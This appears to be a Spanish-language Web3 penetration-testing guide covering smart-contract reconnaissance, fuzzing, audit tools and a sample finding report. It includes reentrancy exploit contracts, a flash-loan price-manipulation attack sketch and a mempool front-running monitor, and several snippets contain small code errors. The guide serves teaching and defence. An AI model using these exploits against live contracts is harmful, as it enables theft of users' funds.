# Pentesting en Web3: Gu√≠a Avanzada

## Introducci√≥n al Pentesting Web3

El pentesting en Web3 requiere un enfoque diferente al pentesting tradicional web2. Aqu√≠ no solo auditamos aplicaciones web, sino tambi√©n smart contracts, wallets, protocolos DeFi, y la interacci√≥n entre capas on-chain y off-chain.

### Diferencias Clave con Web2

| Aspecto | Web2 | Web3 |
|---------|------|------|
| **Inmutabilidad** | C√≥digo se puede patchear | Smart contracts son inmutables (sin proxies) |
| **Transparencia** | C√≥digo backend privado | Todo el c√≥digo on-chain es p√∫blico |
| **Dinero** | Datos sensibles | Valor monetario directo en riesgo |
| **Reversibilidad** | Transacciones reversibles | Transacciones irreversibles |

## 1. Reconocimiento (Reconnaissance)

### 1.1 Identificaci√≥n de Contratos

```bash
# Verificar contratos en Etherscan
curl "https://api.etherscan.io/api?module=contract&action=getsourcecode&address=0x..."

# Identificar contratos relacionados
cast call 0xCONTRACT "owner()" --rpc-url $RPC_URL
cast call 0xCONTRACT "implementation()" --rpc-url $RPC_URL  # Para proxies
```

```typescript
// Enumerar eventos hist√≥ricos para encontrar contratos relacionados
import { createPublicClient, http } from 'viem'
import { mainnet } from 'viem/chains'

const client = createPublicClient({
  chain: mainnet,
  transport: http()
})

async function discoverRelatedContracts(targetAddress: `0x${string}`) {
  // Buscar eventos que involucren el contrato
  const logs = await client.getLogs({
    address: targetAddress,
    fromBlock: BigInt(0),
    toBlock: 'latest'
  })

  // Analizar topics para encontrar interacciones
  const interactedAddresses = new Set<string>()

  logs.forEach(log => {
    log.topics.forEach(topic => {
      if (topic.length === 66 && topic.startsWith('0x000000000000000000000000')) {
        const addr = '0x' + topic.slice(26)
        interactedAddresses.add(addr)
      }
    })
  })

  return Array.from(interactedAddresses)
}
```

### 1.2 An√°lisis de Transacciones Hist√≥ricas

```typescript
// Analizar patrones de transacciones para encontrar vulnerabilidades
async function analyzeTransactionPatterns(contractAddress: `0x${string}`) {
  const recentBlock = await client.getBlockNumber()
  const fromBlock = recentBlock - BigInt(10000) // √öltimos ~2 d√≠as

  const logs = await client.getLogs({
    address: contractAddress,
    fromBlock,
    toBlock: recentBlock
  })

  // Analizar para detectar:
  // - Front-running patterns
  // - Liquidaciones sospechosas
  // - Grandes transferencias antes de exploits
  // - Patrones de MEV

  const txHashes = [...new Set(logs.map(log => log.transactionHash))]

  for (const hash of txHashes.slice(0, 100)) { // L√≠mite para ejemplo
    const tx = await client.getTransaction({ hash })
    const receipt = await client.getTransactionReceipt({ hash })

    console.log({
      hash,
      from: tx.from,
      to: tx.to,
      value: tx.value,
      gasUsed: receipt.gasUsed,
      status: receipt.status
    })
  }
}
```

### 1.3 Mapeo de Arquitectura

```typescript
// Identificar todos los contratos del ecosistema
interface ContractMap {
  main: string
  proxies: string[]
  implementations: string[]
  dependencies: string[]
  admin: string | null
  owner: string | null
}

async function mapContractArchitecture(
  entryPoint: `0x${string}`
): Promise<ContractMap> {
  const map: ContractMap = {
    main: entryPoint,
    proxies: [],
    implementations: [],
    dependencies: [],
    admin: null,
    owner: null
  }

  // Verificar si es un proxy
  try {
    const implementation = await client.readContract({
      address: entryPoint,
      abi: [{
        name: 'implementation',
        type: 'function',
        stateMutability: 'view',
        inputs: [],
        outputs: [{ type: 'address' }]
      }],
      functionName: 'implementation'
    })
    map.implementations.push(implementation as string)
  } catch {}

  // Buscar admin/owner
  try {
    const owner = await client.readContract({
      address: entryPoint,
      abi: [{
        name: 'owner',
        type: 'function',
        stateMutability: 'view',
        inputs: [],
        outputs: [{ type: 'address' }]
      }],
      functionName: 'owner'
    })
    map.owner = owner as string
  } catch {}

  return map
}
```

## 2. An√°lisis de Smart Contracts

### 2.1 Decompilaci√≥n de Bytecode

Cuando no hay c√≥digo fuente verificado:

```bash
# Usando heimdall-rs para decompilaci√≥n avanzada
heimdall decompile 0xCONTRACT_ADDRESS --rpc-url $RPC_URL

# O usando foundry
cast code 0xCONTRACT_ADDRESS --rpc-url $RPC_URL > bytecode.bin

# Analizar con evmdis
evmdis bytecode.bin
```

### 2.2 Fuzzing de Funciones

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract FuzzTarget {
    address target;

    constructor(address _target) {
        target = _target;
    }

    // Fuzzing de funciones payable
    function testFuzzPayableFunctions(
        uint256 amount,
        bytes calldata data
    ) public {
        vm.deal(address(this), amount);

        // Intentar llamadas con diferentes datos
        (bool success, bytes memory returnData) = target.call{value: amount}(data);

        // Verificar que no haya comportamientos inesperados
        if (success) {
            // Analizar returnData
            emit FuzzResult(data, returnData, amount);
        }
    }

    event FuzzResult(bytes input, bytes output, uint256 value);
}
```

### 2.3 An√°lisis de Control de Acceso

```typescript
// Test de permisos y roles
import { expect } from 'chai'
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers'

describe("Access Control Pentest", function() {

  async function deployTarget() {
    const [owner, attacker] = await ethers.getSigners()
    const Contract = await ethers.getContractFactory("TargetContract")
    const contract = await Contract.deploy()
    return { contract, owner, attacker }
  }

  it("Should prevent unauthorized access to admin functions", async function() {
    const { contract, attacker } = await loadFixture(deployTarget)

    // Intentar acceder a funciones privilegiadas
    const adminFunctions = [
      'withdraw',
      'setAdmin',
      'pause',
      'unpause',
      'transferOwnership',
      'upgradeTo'
    ]

    for (const fn of adminFunctions) {
      try {
        const tx = await contract.connect(attacker)[fn]()
        await expect(tx).to.be.reverted
      } catch (error) {
        // Funci√≥n no existe o reverti√≥ correctamente
        console.log(`‚úì ${fn} properly protected or doesn't exist`)
      }
    }
  })

  it("Should test for missing authorization checks", async function() {
    const { contract, attacker } = await loadFixture(deployTarget)

    // Test com√∫n: funci√≥n cr√≠tica sin modifier
    await expect(
      contract.connect(attacker).emergencyWithdraw()
    ).to.be.revertedWith("Unauthorized")
  })
})
```

## 3. Vectores de Ataque Comunes

### 3.1 Reentrancy

```solidity
// Contrato vulnerable
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success);
        balances[msg.sender] = 0; // ‚ùå State update despu√©s de external call
    }
}

// Exploit
contract ReentrancyAttack {
    VulnerableBank bank;
    uint256 public attackCount;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (attackCount < 10 && address(bank).balance > 0) {
            attackCount++;
            bank.withdraw();
        }
    }
}
```

**C√≥mo Detectarlo:**
```typescript
// Script de an√°lisis automatizado
function analyzeForReentrancy(contractCode: string): boolean {
  const patterns = [
    /\.call\{value:.*?\}/,  // External calls con value
    /\.transfer\(/,
    /\.send\(/
  ]

  // Buscar patr√≥n: external call antes de state update
  const hasExternalCall = patterns.some(p => p.test(contractCode))

  if (hasExternalCall) {
    console.warn("‚ö†Ô∏è Posible reentrancy: verificar orden de state updates")
    return true
  }
  return false
}
```

### 3.2 Integer Overflow/Underflow (Pre-Solidity 0.8)

```solidity
// Vulnerable en Solidity < 0.8.0
contract VulnerableToken {
    mapping(address => uint256) public balances;

    function transfer(address to, uint256 amount) public {
        balances[msg.sender] -= amount; // ‚ùå Puede underflow
        balances[to] += amount;         // ‚ùå Puede overflow
    }
}

// Test de overflow
contract OverflowTest is Test {
    function testOverflow() public {
        VulnerableToken token = new VulnerableToken();

        // Setup
        token.mint(address(this), 100);

        // Attack: causar underflow
        vm.expectRevert(); // En Solidity >= 0.8
        token.transfer(address(1), 101);

        // En Solidity < 0.8, esto NO revert√≠a
        // y balances[msg.sender] ser√≠a type(uint256).max
    }
}
```

### 3.3 Flash Loan Attacks

```solidity
// Simulaci√≥n de flash loan attack
contract FlashLoanAttack {
    IUniswapV2Router router;
    ILendingPool pool;

    function executeAttack() external {
        // 1. Pedir prestado via flash loan
        uint256 loanAmount = 1000000 * 1e18;
        pool.flashLoan(
            address(this),
            loanAmount,
            abi.encode("attack")
        );
    }

    function onFlashLoan(
        address initiator,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // 2. Manipular precio en DEX con bajo liquidity
        router.swapExactTokensForTokens(
            amount / 2,
            0,
            getPath(),
            address(this),
            block.timestamp
        );

        // 3. Explotar el precio manipulado en otro protocolo
        vulnerableProtocol.borrowAt ManipulatedPrice();

        // 4. Revertir precio
        router.swapExactTokensForTokens(
            token.balanceOf(address(this)),
            0,
            getReversePath(),
            address(this),
            block.timestamp
        );

        // 5. Devolver flash loan
        token.transfer(msg.sender, amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

**Detecci√≥n:**
```typescript
// Monitorear para flash loan attacks
async function monitorFlashLoans() {
  const flashLoanEvent = {
    anonymous: false,
    inputs: [
      { indexed: true, name: 'receiver', type: 'address' },
      { indexed: true, name: 'token', type: 'address' },
      { indexed: false, name: 'amount', type: 'uint256' }
    ],
    name: 'FlashLoan',
    type: 'event'
  }

  client.watchEvent({
    event: flashLoanEvent,
    onLogs: async (logs) => {
      for (const log of logs) {
        const { receiver, amount } = log.args

        // Alert si el monto es sospechosamente grande
        if (amount > ethers.parseEther("1000000")) {
          console.warn(`üö® Large flash loan detected: ${receiver}`)

          // Analizar transacciones en el mismo bloque
          const tx = await client.getTransaction({
            hash: log.transactionHash
          })
          console.log("Transaction trace:", tx)
        }
      }
    }
  })
}
```

### 3.4 Front-Running & MEV

```typescript
// Detectar oportunidades de front-running
import { WebSocketProvider } from 'ethers'

class MempoolMonitor {
  private provider: WebSocketProvider

  constructor(wsUrl: string) {
    this.provider = new WebSocketProvider(wsUrl)
  }

  async monitorMempool() {
    this.provider.on('pending', async (txHash) => {
      const tx = await this.provider.getTransaction(txHash)
      if (!tx) return

      // Buscar transacciones de alto valor
      if (tx.value > ethers.parseEther("10")) {
        console.log(`High value tx in mempool: ${txHash}`)

        // Analizar si es front-runnable
        await this.analyzeFrontrunOpportunity(tx)
      }

      // Detectar swaps grandes
      if (tx.to === UNISWAP_ROUTER && tx.data.startsWith('0x38ed1739')) {
        console.log(`Large swap detected: ${txHash}`)
        this.decodeSwapData(tx.data)
      }
    })
  }

  async analyzeFrontrunOpportunity(tx: any) {
    // Simular la transacci√≥n
    try {
      const result = await this.provider.call({
        to: tx.to,
        data: tx.data,
        value: tx.value,
        from: tx.from
      })

      console.log("Simulation result:", result)

      // Si es rentable, podr√≠amos enviar una tx con m√°s gas
      // (esto es MEV extraction - usar √©ticamente)
    } catch (error) {
      console.log("Transaction would revert:", error)
    }
  }

  decodeSwapData(data: string) {
    const iface = new ethers.Interface([
      'function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] path, address to, uint deadline)'
    ])

    try {
      const decoded = iface.parseTransaction({ data })
      console.log("Swap details:", {
        amountIn: decoded.args.amountIn.toString(),
        amountOutMin: decoded.args.amountOutMin.toString(),
        path: decoded.args.path,
        slippage: this.calculateSlippage(
          decoded.args.amountIn,
          decoded.args.amountOutMin
        )
      })
    } catch {}
  }

  calculateSlippage(amountIn: bigint, amountOutMin: bigint): number {
    // L√≥gica para calcular slippage esperado
    return 0
  }
}

// Uso
const monitor = new MempoolMonitor('wss://eth-mainnet.g.alchemy.com/v2/KEY')
monitor.monitorMempool()
```

### 3.5 Price Oracle Manipulation

```solidity
// Ejemplo de or√°culo vulnerable
contract VulnerableOracle {
    IUniswapV2Pair pair;

    // ‚ùå MAL: usar precio spot directamente
    function getPrice() public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        return (reserve1 * 1e18) / reserve0;
    }
}

// ‚úÖ BIEN: usar TWAP (Time-Weighted Average Price)
contract SecureOracle {
    IUniswapV2Pair pair;
    uint256 public constant PERIOD = 1 hours;

    uint256 public price0CumulativeLast;
    uint256 public price1CumulativeLast;
    uint32 public blockTimestampLast;

    function update() external {
        (
            uint256 price0Cumulative,
            uint256 price1Cumulative,
            uint32 blockTimestamp
        ) = UniswapV2OracleLibrary.currentCumulativePrices(address(pair));

        uint32 timeElapsed = blockTimestamp - blockTimestampLast;
        require(timeElapsed >= PERIOD, "Too soon");

        // TWAP calculation
        uint256 price0Average = (price0Cumulative - price0CumulativeLast) / timeElapsed;

        price0CumulativeLast = price0Cumulative;
        blockTimestampLast = blockTimestamp;
    }
}

// Test de manipulaci√≥n
contract OracleManipulationTest is Test {
    function testPriceManipulation() public {
        VulnerableOracle oracle = new VulnerableOracle();
        IUniswapV2Pair pair = oracle.pair();

        uint256 priceBefore = oracle.getPrice();

        // Ejecutar swap grande para manipular precio
        IERC20 token0 = IERC20(pair.token0());
        deal(address(token0), address(this), 1000000 * 1e18);

        token0.transfer(address(pair), 500000 * 1e18);
        pair.swap(0, 100000 * 1e18, address(this), "");

        uint256 priceAfter = oracle.getPrice();

        // El precio cambi√≥ significativamente en una sola tx
        assertGt(priceAfter, priceBefore * 2);
        console.log("Price manipulated by:", (priceAfter * 100 / priceBefore));
    }
}
```

## 4. Herramientas de Pentesting Web3

### 4.1 Slither (An√°lisis Est√°tico)

```bash
# Instalar
pip3 install slither-analyzer

# Ejecutar an√°lisis completo
slither . --print human-summary
slither . --print contract-summary
slither . --print function-summary

# Detectores espec√≠ficos
slither . --detect reentrancy-eth
slither . --detect reentrancy-no-eth
slither . --detect unchecked-transfer
slither . --detect unprotected-upgrade

# Generar reporte
slither . --json report.json
```

### 4.2 Mythril (An√°lisis Simb√≥lico)

```bash
# Analizar contrato
myth analyze contracts/Target.sol --solc-json mythril-config.json

# An√°lisis de bytecode
myth analyze -a 0xCONTRACT_ADDRESS --rpc infura-mainnet

# Buscar vulnerabilidades espec√≠ficas
myth analyze -m Reentrancy,IntegerOverflow contracts/Target.sol
```

### 4.3 Echidna (Fuzzing)

```yaml
# echidna-config.yaml
testMode: assertion
testLimit: 100000
deployer: "0x30000"
sender: ["0x10000", "0x20000", "0x30000"]
balanceContract: 0xffffffff
codeSize: 0x6000
coverage: true
```

```solidity
// echidna_test.sol
contract EchidnaTest {
    TargetContract target;

    constructor() {
        target = new TargetContract();
    }

    // Invariant: balance nunca debe ser negativo
    function echidna_balance_positive() public view returns (bool) {
        return target.balance() >= 0;
    }

    // Invariant: total supply nunca debe cambiar
    function echidna_total_supply_constant() public view returns (bool) {
        return target.totalSupply() == 1000000 * 1e18;
    }
}
```

```bash
# Ejecutar fuzzing
echidna-test contracts/echidna_test.sol --contract EchidnaTest --config echidna-config.yaml
```

### 4.4 Foundry (Testing & Fuzzing)

```solidity
// test/Pentest.t.sol
contract PentestSuite is Test {
    TargetContract target;
    address attacker = address(0xbad);

    function setUp() public {
        target = new TargetContract();
        vm.deal(attacker, 100 ether);
    }

    // Fuzz test
    function testFuzz_CannotStealFunds(uint256 amount) public {
        vm.assume(amount > 0 && amount < 100 ether);
        vm.prank(attacker);

        vm.expectRevert();
        target.withdraw(amount);
    }

    // Invariant test
    function invariant_totalSupplyConstant() public {
        assertEq(target.totalSupply(), 1000000 * 1e18);
    }

    // Test de reentrancy
    function testReentrancy() public {
        ReentrancyAttacker attackerContract = new ReentrancyAttacker(target);
        vm.deal(address(attackerContract), 10 ether);

        attackerContract.attack{value: 1 ether}();

        // Verificar que el ataque fall√≥
        assertEq(address(attackerContract).balance, 1 ether);
    }
}
```

### 4.5 Custom Scripts de An√°lisis

```typescript
// automated-pentest.ts
import { exec } from 'child_process'
import { promisify } from 'util'

const execAsync = promisify(exec)

class AutomatedPentest {
  private contractAddress: string
  private results: Map<string, any> = new Map()

  constructor(address: string) {
    this.contractAddress = address
  }

  async runFullScan() {
    console.log("üîç Starting automated pentest...")

    // 1. An√°lisis est√°tico
    await this.runSlither()

    // 2. An√°lisis simb√≥lico
    await this.runMythril()

    // 3. Verificar c√≥digo fuente
    await this.verifySourceCode()

    // 4. An√°lisis de transacciones
    await this.analyzeTransactions()

    // 5. Test de permisos
    await this.testAccessControl()

    // 6. Generar reporte
    this.generateReport()
  }

  async runSlither() {
    console.log("Running Slither...")
    try {
      const { stdout } = await execAsync('slither . --json -')
      this.results.set('slither', JSON.parse(stdout))
    } catch (error) {
      console.error("Slither failed:", error)
    }
  }

  async runMythril() {
    console.log("Running Mythril...")
    try {
      const { stdout } = await execAsync(
        `myth analyze -a ${this.contractAddress} --rpc $RPC_URL -o json`
      )
      this.results.set('mythril', JSON.parse(stdout))
    } catch (error) {
      console.error("Mythril failed:", error)
    }
  }

  async verifySourceCode() {
    console.log("Verifying source code...")
    const response = await fetch(
      `https://api.etherscan.io/api?module=contract&action=getsourcecode&address=${this.contractAddress}`
    )
    const data = await response.json()
    this.results.set('sourceCode', data.result[0])
  }

  async analyzeTransactions() {
    // Implementado en secci√≥n anterior
  }

  async testAccessControl() {
    console.log("Testing access control...")
    // Implementar tests de permisos
  }

  generateReport() {
    const report = {
      timestamp: new Date().toISOString(),
      contract: this.contractAddress,
      findings: {
        critical: [],
        high: [],
        medium: [],
        low: [],
        informational: []
      }
    }

    // Procesar resultados de Slither
    const slitherResults = this.results.get('slither')
    if (slitherResults?.success && slitherResults?.results?.detectors) {
      slitherResults.results.detectors.forEach((finding: any) => {
        const severity = finding.impact.toLowerCase()
        if (report.findings[severity]) {
          report.findings[severity].push({
            tool: 'slither',
            type: finding.check,
            description: finding.description,
            confidence: finding.confidence
          })
        }
      })
    }

    console.log("\nüìä PENTEST REPORT")
    console.log("=" .repeat(50))
    console.log(`Contract: ${this.contractAddress}`)
    console.log(`Critical: ${report.findings.critical.length}`)
    console.log(`High: ${report.findings.high.length}`)
    console.log(`Medium: ${report.findings.medium.length}`)
    console.log(`Low: ${report.findings.low.length}`)

    return report
  }
}

// Uso
const pentest = new AutomatedPentest('0x...')
pentest.runFullScan()
```

## 5. Metodolog√≠a de Pentest Web3

### 5.1 Checklist Completo

- [ ] **Reconocimiento**
  - [ ] Identificar todos los contratos del ecosistema
  - [ ] Mapear arquitectura (proxies, implementations, dependencies)
  - [ ] Identificar roles y permisos
  - [ ] Analizar hist√≥rico de transacciones
  - [ ] Verificar c√≥digo fuente en Etherscan

- [ ] **An√°lisis Est√°tico**
  - [ ] Ejecutar Slither
  - [ ] Ejecutar Mythril
  - [ ] Revisar c√≥digo manualmente
  - [ ] Verificar imports y dependencias
  - [ ] Buscar c√≥digo duplicado

- [ ] **An√°lisis Din√°mico**
  - [ ] Fuzzing con Echidna
  - [ ] Property testing con Foundry
  - [ ] Simulaciones de ataques
  - [ ] Fork testing contra mainnet

- [ ] **Vectores de Ataque**
  - [ ] Reentrancy
  - [ ] Integer overflow/underflow
  - [ ] Access control
  - [ ] Front-running
  - [ ] Flash loan attacks
  - [ ] Oracle manipulation
  - [ ] Delegatecall injection
  - [ ] Signature replay
  - [ ] Gas griefing

- [ ] **Tests de Integraci√≥n**
  - [ ] Interacci√≥n con otros protocolos
  - [ ] Comportamiento en edge cases
  - [ ] Manejo de tokens no est√°ndar
  - [ ] Pausabilidad y upgrades

- [ ] **Documentaci√≥n**
  - [ ] Reporte ejecutivo
  - [ ] Findings detallados con PoC
  - [ ] Recomendaciones de fixes
  - [ ] Plan de remediaci√≥n

### 5.2 Ejemplo de Reporte de Finding

```markdown
## [CRITICAL] Reentrancy Vulnerability in withdraw()

### Descripci√≥n
La funci√≥n `withdraw()` realiza una llamada externa antes de actualizar el estado,
permitiendo un ataque de reentrancy que puede drenar todos los fondos del contrato.

### Ubicaci√≥n
`contracts/Vault.sol:45-52`

### Proof of Concept
\`\`\`solidity
contract ReentrancyExploit {
    Vault vault;

    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}
\`\`\`

### Impacto
- **Severidad**: CRITICAL
- **Likelihood**: HIGH
- **Impacto Financiero**: P√©rdida total de fondos (~$X millones)

### Remediaci√≥n
\`\`\`solidity
function withdraw() public {
    uint256 balance = balances[msg.sender];
    balances[msg.sender] = 0;  // ‚úÖ State update ANTES de external call

    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Transfer failed");
}
\`\`\`

O usar OpenZeppelin's ReentrancyGuard:
\`\`\`solidity
function withdraw() public nonReentrant {
    // ...
}
\`\`\`
```

## 6. Pr√≥ximos Pasos

Despu√©s de dominar el pentesting, contin√∫a con:
- `audit.md` - Metodolog√≠a completa de auditor√≠a
- `vulnerabilities.md` - Cat√°logo de vulnerabilidades Web3
- `tools.md` - Herramientas avanzadas de seguridad

## Referencias

- [Smart Contract Weakness Classification (SWC)](https://swcregistry.io/)
- [Consensys Best Practices](https://consensys.github.io/smart-contract-best-practices/)
- [Trail of Bits Building Secure Contracts](https://github.com/crytic/building-secure-contracts)
- [Secureum Bootcamp](https://secureum.substack.com/)
